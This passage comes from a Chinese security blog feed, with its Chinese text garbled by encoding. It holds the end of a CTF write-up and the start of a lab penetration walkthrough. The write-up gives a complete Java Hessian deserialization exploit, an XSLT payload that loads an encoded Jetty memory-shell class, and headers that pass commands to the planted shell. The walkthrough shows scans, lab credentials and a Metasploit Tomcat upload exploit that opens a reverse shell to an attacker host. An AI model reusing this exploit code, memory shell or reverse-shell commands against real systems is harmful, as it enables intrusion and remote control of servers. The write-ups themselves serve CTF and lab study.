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&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;com.xxl.job.core.JettyGodzillaMemshell&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸€å®šè¦è®°å¾—defineClassçš„ç±»åè¦æ”¹å•Šï¼Œä¸ç„¶å°±æŠ¥é”™äº†ï¼Œä¸€å¼€å§‹å¿˜æ”¹äº†æ‰“äº†å¥½ä¹…éƒ½æ²¡é€šğŸ˜­ï¼Œç„¶åå»å‰é¢è¯•äº†ä¸€ä¸‹apiçš„æœªæˆæƒï¼Œä¹Ÿæ˜¯æ²¡å†™å¯¹ç±»åå¯¼è‡´çš„ğŸ˜­æµªè´¹æˆ‘å¥½å¤šæ—¶é—´</p></blockquote><p>ç„¶åå°±æ˜¯ä¸€æŠŠæ¢­payloadæ‰“ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//è§£æxsltæ–‡ä»¶ç”Ÿæ•ˆ</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172043678.png" alt="image-20241128172043678"></p><p>ç„¶åè¯·æ±‚å¤´x-fuck-dataä¸ºcmdæ—¶å°±å¯ä»¥ç›´æ¥ä»»æ„å‘½ä»¤äº†</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-fuck-data</span><span class="hljs-punctuation">: </span>cmd<br><span class="hljs-attribute">cmd</span><span class="hljs-punctuation">: </span>ls /<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172129357.png" alt="image-20241128172129357"></p><p>æƒ³ç”¨å“¥æ–¯æ‹‰å»è¿æ¥çš„ï¼Œä½†æ˜¯è¿ä¸ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>æƒ³è¯•ä¸€ä¸‹å†°èé©¬çš„ï¼Œä½†æ˜¯æ‰“è¿›å»è¿ä¸ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å’ŒHandlerçš„æœºåˆ¶æœ‰å…³ï¼ŒJettyè¿™å—è¿˜ä¸å¤ªç†Ÿï¼Œæœ‰æœºä¼šå†ç ”ç©¶</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/ph4nt0mer/p/13913252.html">https://www.cnblogs.com/ph4nt0mer/p/13913252.html</a></p><p><a href="https://forum.butian.net/share/2592">https://forum.butian.net/share/2592</a></p><p><a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p><a href="https://blog.csdn.net/2301_79724395/article/details/141229224">https://blog.csdn.net/2301_79724395/article/details/141229224</a></p><p>å®˜æ–¹wpï¼š<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ç”±äºé¢˜ç›®æ˜¯å…¬å…±é¶æœºç°åœ¨å·²ç»æŒ‚äº†ï¼Œæ‰€ä»¥å¤ç°éœ€è¦è‡ªå·±æ­å»ºé¢˜ç›®ç¯å¢ƒ&lt;/p&gt;
&lt;p&gt;è·Ÿç€è¿™ç¯‡æ–‡ç« æ¥é…ç½®ä¸€ä¸‹ï¼š&lt;a href=&quot;htt</summary>
      
    
    
    
    <category term="é¢˜ç›®å¤ç°" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºå››</title>
    <link href="https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
    <id>https://clowsman.github.io/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</id>
    <published>2024-11-15T14:00:56.000Z</published>
    <updated>2024-11-16T15:05:14.349Z</updated>
    
    <content type="html"><![CDATA[<p>å› ä¸ºå…¼å®¹æ€§å·²ç»ä¼¼äº†ä¸¤ä¸ªé¶åœºï¼Œæ±‚æ±‚ä½ åˆ«ä¼¼äº†</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ VMnet0å’ŒVMnet1éƒ½æ˜¯ä»…ä¸»æœºæ¨¡å¼</p><p><img src="https://cdn.clown2024.cn/image-20241115220741988.png" alt="image-20241115220741988"></p><p><strong>webé¶æœº</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221245366.png" alt="image-20241115221245366"></p><p><strong>win7</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221326010.png" alt="image-20241115221326010"></p><p><strong>DC</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221401258.png" alt="image-20241115221401258"></p><h2 id="é¶åœºæ‹“æ‰‘å›¾"><a href="#é¶åœºæ‹“æ‰‘å›¾" class="headerlink" title="é¶åœºæ‹“æ‰‘å›¾"></a>é¶åœºæ‹“æ‰‘å›¾</h2><p><img src="https://cdn.clown2024.cn/image-20241115221119472.png" alt="image-20241115221119472"></p><p>æˆ‘ä»¬å¯åŠ¨ä¹‹åè¦å»webé¶æœºé‡Œé¢å¯åŠ¨ä¸‰ä¸ªå®¹å™¨æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241115222514020.png" alt="image-20241115222514020"></p><p>æˆ‘ä»¬å¯åŠ¨å‰ä¸‰ä¸ªå®¹å™¨æœåŠ¡å³å¯</p><p>ç„¶åæˆ‘ä»¬çš„æ”»å‡»æœºè‡ªç„¶ä¹Ÿè¦åœ¨VMnet0çš„ç½‘æ®µ</p><blockquote><p>å¥½æ¬¸é¶æœºç»ˆäºæ´»äº†ä¸€æ¬¡äº†ğŸ˜­</p></blockquote><h2 id="æœºå™¨å¯†ç "><a href="#æœºå™¨å¯†ç " class="headerlink" title="æœºå™¨å¯†ç "></a>æœºå™¨å¯†ç </h2><ul><li>ubuntu:ubuntu <strong>åŸŸæˆå‘˜æœºå™¨</strong></li><li>douser:Dotest123 <strong>DC</strong></li><li>administrator:Test2008ï¼ˆæ”¹æˆ Admin123 å› ä¸ºè¿‡æœŸäº†ï¼‰</li></ul><h1 id="è€ƒç‚¹æè¿°"><a href="#è€ƒç‚¹æè¿°" class="headerlink" title="è€ƒç‚¹æè¿°"></a>è€ƒç‚¹æè¿°</h1><p>æœ¬æ¬¡é¶åœºæ¸—é€<strong>ååºåˆ—åŒ–æ¼æ´ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ã€Tomcatæ¼æ´ã€MSç³»åˆ—æ¼æ´ã€ç«¯å£è½¬å‘æ¼æ´ã€ä»¥åŠåŸŸæ¸—é€</strong>ç­‰å¤šç§ç»„åˆæ¼æ´</p><p><strong>é¶åœºå­¦ä¹ è·¯å¾„ï¼Œå¯å‚è€ƒ</strong></p><ul><li>stæ¼æ´åˆ©ç”¨</li><li>phpmyadmin getshell</li><li>tomcat æ¼æ´åˆ©ç”¨</li><li>dockeré€ƒé€¸</li><li>ms14-068</li><li>sshå¯†é’¥åˆ©ç”¨</li><li>æµé‡è½¬å‘</li><li>å†å²å‘½ä»¤ä¿¡æ¯æ³„éœ²</li><li>åŸŸæ¸—é€</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å…ˆç”¨arp-scanæ‰«ä¸€ä¸‹åŒä¸€ç½‘æ®µå†…çš„ä¸»æœºï¼ŒæŒ‡å®šå¯¹åº”çš„ç½‘å¡æ¥å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp-scan -I eth1 -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115223747881.png" alt="image-20241115223747881"></p><p>é‚£å¯ä»¥å¾—çŸ¥192.168.157.128å°±æ˜¯æˆ‘ä»¬çš„å¤–ç½‘webé¶æœº</p><p>æ¥ä¸‹æ¥ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sT -sV 192.168.157.128<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸‹é¢çš„æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:39 EST<br>Nmap scan report for 192.168.157.128<br>Host is up (0.0013s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>2001/tcp open  http    Jetty 9.2.11.v20150529<br>2002/tcp open  http    Apache Tomcat 8.5.19<br>2003/tcp open  http    Apache httpd 2.4.25<br>MAC Address: 00:0C:29:E3:C5:36 (VMware)<br>Service Info: Host: 172.19.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªå¼€æ”¾ç«¯å£éƒ½æœ‰æœåŠ¡ï¼Œ2001ã€2002ã€2003ï¼Œ22çš„sshæœåŠ¡ä¸€èˆ¬å…ˆè·³è¿‡</p><p>ç„¶åä¸Šfscanæ‰«ä¸€ä¸‹æ¼æ´å§</p><p>éƒ½èƒ½æ‰«å‡ºæ¥ç›¸å…³çš„æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.157.128:2002 open<br>192.168.157.128:2001 open<br>192.168.157.128:2003 open<br>[*] alive ports len is: 3<br>start vulscan<br>[*] WebTitle http://192.168.157.128:2002 code:200 len:11230  title:Apache Tomcat/8.5.19<br>[*] WebTitle http://192.168.157.128:2001 code:200 len:1077   title:Struts2 Showcase - Fileupload sample<br>[+] PocScan http://192.168.157.128:2002 poc-yaml-iis-put-getshell <br>[+] PocScan http://192.168.157.128:2002 poc-yaml-tomcat-cve-2017-12615-rce        <br>[+] PocScan http://192.168.157.128:2001 poc-yaml-struts2_045 poc1<br></code></pre></td></tr></table></figure><blockquote><p>ä¸æ˜¯ä»–æ€ä¹ˆ2003ç«¯å£æ²¡æ‰«å‡ºæ¥æ´å‘¢ğŸ¤”ï¼Œè¿™æŒ‰ç†æ¥è¯´åº”è¯¥æ˜¯æœ‰çš„å§</p></blockquote><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><h2 id="tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"><a href="#tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´" class="headerlink" title="tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"></a>tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</h2><p>é‚£å°±ä¸ç®¡äº†å…ˆæ¥çœ‹ä¸€ä¸‹ä»–çš„æœåŠ¡å§ï¼Œçœ‹ä¸€ä¸‹tomcat-cve-2017-12615-rceæ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ªtomcatçš„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</p><p>ç›´æ¥ç”¨msfæœä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„tomcatçš„cve</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search cve-2017 tomcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115230446678.png" alt="image-20241115230446678"></p><p>æ‰¾åˆ°äº†ä¸€ä¸ªå¯¹åº”çš„rceæ¼æ´ï¼Œé‚£å°±æ‰“ä¸€ä¸‹è¯•è¯•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/http/tomcat_jsp_upload_bypass<br>show payloads<br><span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.157.129<br><span class="hljs-built_in">set</span> rhost 192.168.157.128<br><span class="hljs-built_in">set</span> rport 2002<br>run<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½å¼¹ä¸€ä¸ªshellå›æ¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20241115230644472.png" alt="image-20241115230644472"></p><p>ä¸è¿‡è¿™æ ·æ“ä½œèµ·æ¥ä¸å¤ªæ–¹ä¾¿ï¼Œå»æ‰¾payloadä¸Šä¼ ä¸€ä¸ªå†°èçš„shellï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­ä¸Šä¼ æœ¨é©¬</p><p>ç½‘ä¸Šéšä¾¿æ‰¾åˆ°ä¸€ä¸ªexpï¼š<a href="https://www.cnblogs.com/confidant/p/15440233.html">https://www.cnblogs.com/confidant/p/15440233.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span 